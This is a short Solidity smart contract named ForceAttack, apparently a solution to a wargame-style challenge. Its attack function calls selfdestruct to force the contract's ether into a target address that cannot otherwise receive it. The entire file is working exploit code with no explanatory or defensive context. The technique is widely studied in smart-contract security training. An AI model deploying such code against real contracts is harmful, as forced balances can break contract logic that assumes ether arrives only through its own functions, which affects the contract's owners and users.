contract ForceAttack {
    
    constructor() public payable {
        require (msg.value == 1 wei);
    }
    
    function attack(address payable target) public payable{
        selfdestruct(target);
    }
    
}